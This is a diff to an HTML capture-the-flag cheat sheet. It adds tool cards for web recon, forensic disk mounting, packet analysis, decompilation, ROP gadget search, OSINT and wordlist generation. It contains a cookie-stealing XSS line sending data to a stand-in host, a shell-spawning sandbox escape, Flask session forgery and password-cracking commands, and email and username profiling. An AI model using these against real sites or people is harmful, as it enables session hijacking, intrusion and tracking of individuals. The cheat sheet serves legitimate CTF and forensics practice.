@@ -1080,6 +1080,22 @@ new Image().src='//YOUR_HOST/?c='+encodeURIComponent(document.cookie)   // class
 # Serve payloads from your own VPS; collect exfil at interactsh / a webhook / your listener.
 # V8-in-the-browser crossover (Ibrahim's Tea): the "web" chall is really a renderer exploit.</pre></div>
   </div>
+
+  <div class="card">
+    <h3>More web tools — recommended usage</h3>
+    <div class="desc">Installed by <code>install.sh</code> (web). Reach for these when ffuf/sqlmap/Burp aren't enough.</div>
+    <div class="tags"><span>feroxbuster</span><span>wfuzz</span><span>nikto</span><span>whatweb</span></div>
+    <div class="snip"><span class="lbl">recon — fingerprint &amp; recursive content discovery</span><button class="copy">Copy</button><pre>whatweb -a3 https://t                       # CMS, framework, server, versions
+feroxbuster -u https://t -w common.txt -x php,txt,bak -r   # recursive, auto-follows dirs
+nikto -h https://t                           # known misconfig / stale-file scan
+wfuzz -c -z file,common.txt --hc 404 https://t/FUZZ        # fuzz paths (or any marker)</pre></div>
+    <div class="tags"><span>flask-unsign</span><span>git-dumper</span></div>
+    <div class="snip"><span class="lbl">session &amp; source recovery</span><button class="copy">Copy</button><pre>flask-unsign --decode --cookie 'eyJ...'                     # read a Flask session cookie
+flask-unsign --unsign --cookie 'eyJ...' --wordlist rockyou.txt   # crack SECRET_KEY
+flask-unsign --sign --cookie "{'admin':True}" --secret 'KEY'     # forge once cracked
+git-dumper https://t/.git/ ./dump          # rebuild source from an exposed /.git</pre></div>
+    <div class="hint"><b>Order:</b> <code>whatweb</code> → <code>feroxbuster</code> for the map, then test by bug class. Always try <code>/.git/</code>, <code>/.env</code>, <code>/backup.zip</code> before deep fuzzing.</div>
+  </div>
 </section>
 
 <!-- ================================================================ DISK -->
@@ -1195,6 +1211,23 @@ oledump.py doc.doc</pre></div>
     <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>dislocker -r -V enc.dd -p RECOVERY-KEY -- /mnt/dis
 mount -o ro,loop /mnt/dis/dislocker-file /mnt/clear
 bitlocker2john -i enc.dd > h && hashcat -m 22100 h rockyou.txt   # crack</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>More disk tools — recommended usage</h3>
+    <div class="desc">Installed by <code>install.sh</code> (forensics/triage). Mount the right container, then carve or extract.</div>
+    <div class="tags"><span>ewfmount</span><span>guestmount</span><span>testdisk</span><span>photorec</span></div>
+    <div class="snip"><span class="lbl">mount E01/VMDK images &amp; recover partitions</span><button class="copy">Copy</button><pre>ewfmount eco.E01 /mnt/ewf          # EnCase .E01 -> /mnt/ewf/ewf1 (a raw dd)
+mmls /mnt/ewf/ewf1                   # partition table + offsets
+guestmount -a disk.vmdk -i --ro /mnt/g   # auto-detect FS of a VMDK/qcow2 (read-only)
+testdisk disk.dd                     # repair/undelete partitions (interactive)
+photorec disk.dd                     # signature-carve lost files when FS is gone</pre></div>
+    <div class="tags"><span>qpdf</span><span>pdfimages</span><span>poppler</span></div>
+    <div class="snip"><span class="lbl">PDF — unlock &amp; pull embedded content</span><button class="copy">Copy</button><pre>qpdf --decrypt in.pdf out.pdf        # strip owner/user password (if known/none)
+qpdf --show-encryption in.pdf        # which perms/cipher are set
+pdfimages -all in.pdf img            # extract every embedded image
+pdftotext -layout in.pdf -           # text preserving columns -> stdout</pre></div>
+    <div class="hint"><b>Always mount read-only</b> (<code>--ro</code> / <code>ewfmount</code> is ro by design) so you never alter the evidence, then work off a copy.</div>
   </div>
 </section>
 
@@ -1355,6 +1388,23 @@ tcpdump -i eth0 'udp port 53'            # DNS
 tcpdump -i eth0 'icmp'
 # note: capture filters use BPF syntax, display filters use Wireshark syntax — different!</pre></div>
   </div>
+
+  <div class="card">
+    <h3>More network tools — recommended usage</h3>
+    <div class="desc">Installed by <code>install.sh</code> (net). For greps over packets, protocol logs, and the classic USB-keystroke challenge.</div>
+    <div class="tags"><span>ngrep</span><span>tshark</span></div>
+    <div class="snip"><span class="lbl">grep packets &amp; build protocol logs</span><button class="copy">Copy</button><pre>ngrep -I cap.pcap -q -W byline 'flag'       # grep payloads, print matching packets
+# per-request log (tshark stands in for zeek, which is currently broken in Kali rolling):
+tshark -r cap.pcap -Y http.request -T fields -e ip.dst -e http.host -e http.request.uri | grep -i flag
+tshark -r cap.pcap -q -z conv,tcp           # conversation summary (who talked to whom)
+# zeek alternative: 'docker run -v $PWD:/d zeek/zeek zeek -r /d/cap.pcap' for conn/http/dns logs</pre></div>
+    <div class="tags"><span>scapy</span><span>pyshark</span></div>
+    <div class="snip"><span class="lbl">script packet parsing in Python</span><button class="copy">Copy</button><pre>python3 -c "from scapy.all import *;[print(bytes(p[Raw].load)) for p in rdpcap('c.pcap') if Raw in p]"
+# pyshark = tshark bindings with display filters:
+python3 -c "import pyshark;[print(p) for p in pyshark.FileCapture('c.pcap',display_filter='http.request')]"</pre></div>
+    <div class="snip"><span class="lbl alt">USB HID — reconstruct typed keystrokes (classic)</span><button class="copy">Copy</button><pre>tshark -r usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt
+python3 ~/tools/ctf-usb-keyboard-parser/usbkeyboard.py data.txt   # -> the typed text/flag</pre></div>
+  </div>
 </section>
 
 <!-- ================================================================ STEGO -->
@@ -1459,6 +1509,21 @@ print(s.check()); m=s.model(); print(bytes(m[x].as_long() for x in c))</pre></di
 objdump -d vm | less            # Ghidra: look for the jump table behind the decode step</pre></div>
     <div class="hint"><b>Non-standard word sizes</b> (e.g. the ICX 23/24-bit word) are common — read with a bit-reader, not <code>struct</code>. <b>Polyglots</b> (<em>Two Worlds One Heart</em>): <code>file</code> lies; look for a second format mid-file (magic bytes, <code>7z l</code>, <code>binwalk</code>) and carve it out. <b>Staged/layered</b> (<em>Operation Split Horizon</em>): one stage decrypts the next — script the whole chain.</div>
   </div>
+
+  <div class="card">
+    <h3>More rev tools — PyInstaller &amp; Android recipes</h3>
+    <div class="desc">Installed by <code>install.sh</code> (rev + essentials). The exact commands behind the "Other targets" hint above.</div>
+    <div class="tags"><span>pyinstxtractor</span><span>pycdc</span><span>upx</span></div>
+    <div class="snip"><span class="lbl">PyInstaller .exe → .pyc → source</span><button class="copy">Copy</button><pre>upx -d dist.exe -o unpacked.exe 2>/dev/null || true   # un-pack first if UPX-packed
+python3 ~/tools/pyinstxtractor.py unpacked.exe        # -> unpacked.exe_extracted/
+# decompile the entry .pyc (pycdc; it also handles 3.11/3.12 bytecode):
+pycdc unpacked.exe_extracted/your_script.pyc > source.py</pre></div>
+    <div class="tags"><span>apktool</span><span>dex2jar</span><span>jadx</span></div>
+    <div class="snip"><span class="lbl">Android APK → smali &amp; Java</span><button class="copy">Copy</button><pre>apktool d app.apk -o app_src        # resources + smali (edit &amp; rebuild with 'apktool b')
+d2j-dex2jar app.apk -o app.jar      # classes.dex -> .jar for Java decompilers
+jadx-gui app.apk                     # best one-shot: Java view + resources + strings
+grep -rniE 'flag|http|secret|api' app_src/   # often hardcoded in smali/strings.xml</pre></div>
+  </div>
 </section>
 
 <!-- ================================================================ PWN -->
@@ -1531,6 +1596,18 @@ d8 --allow-natives-syntax chall.js   # %DebugPrint(obj), %SystemBreak() to inspe
 # PHP disable_functions bypass: FFI::cdef(), LD_PRELOAD via putenv+mail(), or an
 #   iconv/CVE chain; php.ini is shipped so diff it for what's actually blocked.</pre></div>
   </div>
+
+  <div class="card">
+    <h3>More pwn tools — recommended usage</h3>
+    <div class="desc">Installed by <code>install.sh</code> (pwn). Set up the challenge libc, find gadgets, talk to the service.</div>
+    <div class="tags"><span>pwninit</span><span>ropper</span><span>socat</span></div>
+    <div class="snip"><span class="lbl">prep &amp; gadget hunting</span><button class="copy">Copy</button><pre>pwninit                              # auto: patch ./vuln to use the given libc/ld, fetch symbols
+ropper -f ./vuln --search 'pop rdi; ret'      # richer gadget search than ROPgadget
+ropper -f ./vuln --chain 'execve cmd=/bin/sh' # auto-build a ROP chain
+# test your exploit against a local copy of the remote service:
+socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./vuln   # then exploit remote('localhost',1337)</pre></div>
+    <div class="hint"><b>Flow:</b> <code>pwninit</code> first so local == remote libc, develop with <code>process()</code>, then flip to <code>remote()</code>. <code>ropper</code>'s <code>--chain</code> is a fast first draft you then trim.</div>
+  </div>
 </section>
 
 <!-- ================================================================ OSINT -->
@@ -1555,6 +1632,18 @@ holehe EMAIL                             # which services an email is registered
 curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
 curl -s 'http://web.archive.org/cdx/search/cdx?url=target.com*&output=json' | head</pre></div>
     <div class="hint"><b>Tool map:</b> username→WhatsMyName/Maigret · domain→whois/dnsrecon/crt.sh · old page→archive.org + Google cache · ships→MarineTraffic/VesselFinder · planes→ADS-B Exchange/FlightRadar24 · code leaks→GitHub dorks + grep.app.</div>
+  </div>
+
+  <div class="card">
+    <h3>More OSINT tools — recommended usage</h3>
+    <div class="desc">Installed by <code>install.sh</code> (osint). The CLI commands behind the tool map above.</div>
+    <div class="tags"><span>maigret</span><span>holehe</span><span>dnsrecon</span><span>whois</span></div>
+    <div class="snip"><span class="lbl">username · email · domain enumeration</span><button class="copy">Copy</button><pre>maigret USERNAME --html             # deeper than sherlock; writes a report w/ found profiles
+holehe EMAIL                         # services where that email has an account
+whois target.com                     # registrar, dates, nameservers, contacts
+dnsrecon -d target.com -t std        # A/AAAA/MX/NS/TXT/SOA records
+dnsrecon -d target.com -D subs.txt -t brt   # brute subdomains from a list</pre></div>
+    <div class="hint"><b>Pivot:</b> an email from <code>holehe</code> → feed the username to <code>maigret</code> → check each profile's bio/links; a domain → <code>dnsrecon</code> + crt.sh for subdomains and infrastructure.</div>
   </div>
 </section>
 
@@ -1610,6 +1699,17 @@ getattr(getattr(__import__(chr(111)+chr(115)),'system'))('sh')
     <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>zbarimg code.png                 # decode QR / EAN / Code128 ...
 # broken QR: open in GIMP, restore the 3 finder squares + quiet zone, re-scan
 # raw QR matrix -> reconstruct at qrazybox.com (recover with partial data)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Build a targeted wordlist — crunch &amp; cewl</h3>
+    <div class="desc">Installed by <code>install.sh</code>. When rockyou misses and the password follows a known pattern or comes from a site's own words.</div>
+    <div class="tags"><span>crunch</span><span>cewl</span></div>
+    <div class="snip"><span class="lbl">generate candidates, then feed john/hashcat/fcrackzip</span><button class="copy">Copy</button><pre>crunch 8 8 -t 'CTF@@@@@' -o wl.txt          # fixed prefix + 5 lowercase (@=a-z, ,=A-Z, %=0-9, ^=sym)
+crunch 6 6 0123456789 -o pins.txt            # all 6-digit PINs from a custom charset
+cewl -d 2 -m 5 -w site.txt https://target    # scrape the site's own words as a wordlist
+john --wordlist=wl.txt hash                   # or: hashcat -a0 hash wl.txt / fcrackzip -D -p wl.txt</pre></div>
+    <div class="hint"><b>Rules beat size:</b> prefer a small <code>cewl</code> list + <code>--rules</code> (john) or <code>-r rules/best64.rule</code> (hashcat) over a massive <code>crunch</code> brute — same coverage, far faster.</div>
   </div>
 </section>
 
